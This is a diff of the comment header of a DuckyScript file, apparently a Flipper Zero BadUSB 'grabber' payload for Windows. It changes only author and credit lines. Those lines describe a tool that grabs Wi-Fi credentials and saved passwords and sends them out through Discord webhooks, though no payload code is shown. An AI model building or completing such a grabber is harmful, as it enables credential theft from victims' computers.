@@ -1,8 +1,8 @@
 REM Title: Ultimate Flipper Grabber
-REM Author: blobs0 (https://github.com/blobs0/Ultimate-Flipper-Grabber)
-REM Credit Discord webhooks functions :I-am-jakoby
-REM Credit Wifi grabber : 7h30th3r0n3 and the0bone
-REM Credit Password Nirsoft : moosehadley
+REM Author + Code Fixer: qqwizzixxxx
+REM Credit Discord webhooks functions : stollen form I-am-jakoby
+REM Credit Wifi grabber :made by 7h30th3r0n3 and the0bone
+REM Credit Password : moosehadley
 REM Target:  Windows 10/11 (7/8 not tested)
 REM Supported Layout keyboard: US/FR/DE
 REM Version: 1.1
